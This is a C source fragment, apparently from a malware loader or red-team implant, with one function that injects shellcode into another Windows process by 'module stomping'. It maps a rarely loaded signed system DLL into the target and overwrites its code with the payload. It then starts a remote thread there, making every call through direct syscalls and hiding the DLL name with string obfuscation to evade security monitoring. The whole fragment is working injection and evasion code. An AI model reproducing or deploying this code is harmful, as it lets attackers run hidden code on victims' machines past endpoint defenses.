/* map a signed DLL into target and overwrite its .text with shellcode */
int inject_stomp(DWORD pid, const BYTE *sc, SIZE_T sc_len, const char *dll_path)
{
    if (!sc || !sc_len)
        return -1;
    if (!_init() || !_init_stomp())
        return -1;

    /* Resolve DLL path */
    char path_buf[MAX_PATH];
    if (!dll_path || !dll_path[0])
    {
        GetSystemDirectoryA(path_buf, sizeof(path_buf));
        size_t plen = strlen(path_buf);
        /* xpsservices.dll: small, always present, rarely loaded */
        char _tail[18];
        _tail[0] = '\\';
        EVS_D(_tail + 1, EVS_dll_xpsservices);
        size_t _tlen = strlen(_tail);
        if (plen + _tlen < sizeof(path_buf))
            memcpy(path_buf + plen, _tail, _tlen + 1);
        dll_path = path_buf;
    }

    /* open DLL shared-read to avoid interfering with loaders */
    HANDLE hFile = CreateFileA(dll_path,
                               GENERIC_READ,
                               FILE_SHARE_READ | FILE_SHARE_WRITE,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return -2;

    /* Create image section (SEC_IMAGE = 0x1000000) */
    HANDLE hSection = NULL;
    NTSTATUS st = inj_sc(s_ssn[SSN_CRTSEC],
                         (uintptr_t)&hSection, 0xF001F, 0, 0,
                         0x02, 0x1000000, (uintptr_t)hFile, 0, 0, 0, 0);
    CloseHandle(hFile);
    if (st)
        return -3;

    /* Open target process */
    HANDLE hproc = NULL;
    INJ_OA oa = {sizeof(oa), NULL, NULL, 0, NULL, NULL};
    INJ_CID cid = {(HANDLE)(uintptr_t)pid, NULL};

    st = inj_sc(s_ssn[SSN_OPEN],
                (uintptr_t)&hproc, PROCESS_ALL_ACCESS, (uintptr_t)&oa, (uintptr_t)&cid,
                0, 0, 0, 0, 0, 0, 0);
    if (st)
    {
        CloseHandle(hSection);
        return -4;
    }

    /* Map view into target — protection determined by image sections */
    PVOID base = NULL;
    SIZE_T view_sz = 0;
    st = inj_sc(s_ssn[SSN_MAPSEC],
                (uintptr_t)hSection, (uintptr_t)hproc, (uintptr_t)&base, 0,
                0, 0, (uintptr_t)&view_sz, 2, 0, 0x20, 0);
    CloseHandle(hSection);
    if (st)
    {
        inj_sc(s_ssn[SSN_CLOSE], (uintptr_t)hproc, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        return -5;
    }

    /* Change first sc_len bytes of view to RW for writing */
    PVOID prot_base = base;
    SIZE_T prot_sz = sc_len;
    ULONG old_prot;
    st = inj_sc(s_ssn[SSN_PROT],
                (uintptr_t)hproc, (uintptr_t)&prot_base, (uintptr_t)&prot_sz,
                PAGE_READWRITE, (uintptr_t)&old_prot, 0, 0, 0, 0, 0, 0);
    if (st)
    {
        inj_sc(s_ssn[SSN_UNMAPSEC], (uintptr_t)hproc, (uintptr_t)base, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        inj_sc(s_ssn[SSN_CLOSE], (uintptr_t)hproc, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        return -6;
    }

    /* write shellcode over the module's .text region */
    SIZE_T nw = 0;
    st = inj_sc(s_ssn[SSN_WRITE],
                (uintptr_t)hproc, (uintptr_t)base, (uintptr_t)sc, (uintptr_t)sc_len,
                (uintptr_t)&nw, 0, 0, 0, 0, 0, 0);
    if (st || nw != sc_len)
    {
        inj_sc(s_ssn[SSN_UNMAPSEC], (uintptr_t)hproc, (uintptr_t)base, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        inj_sc(s_ssn[SSN_CLOSE], (uintptr_t)hproc, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        return -7;
    }

    /* Restore RX */
    prot_base = base;
    prot_sz = sc_len;
    st = inj_sc(s_ssn[SSN_PROT],
                (uintptr_t)hproc, (uintptr_t)&prot_base, (uintptr_t)&prot_sz,
                PAGE_EXECUTE_READ, (uintptr_t)&old_prot, 0, 0, 0, 0, 0, 0);
    if (st)
    {
        inj_sc(s_ssn[SSN_UNMAPSEC], (uintptr_t)hproc, (uintptr_t)base, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        inj_sc(s_ssn[SSN_CLOSE], (uintptr_t)hproc, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        return -8;
    }

    /* Execute shellcode — thread starts at mapped base (stomped .text entry) */
    HANDLE hthread = NULL;
    st = inj_sc(s_ssn[SSN_THREAD],
                (uintptr_t)&hthread, THREAD_ALL_ACCESS, 0, (uintptr_t)hproc,
                (uintptr_t)base, 0, 0, 0, 0, 0, 0);
    if (st)
    {
        inj_sc(s_ssn[SSN_UNMAPSEC], (uintptr_t)hproc, (uintptr_t)base, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        inj_sc(s_ssn[SSN_CLOSE], (uintptr_t)hproc, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        return -9;
    }

    CloseHandle(hthread);
    inj_sc(s_ssn[SSN_CLOSE], (uintptr_t)hproc, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
    return 0;
}
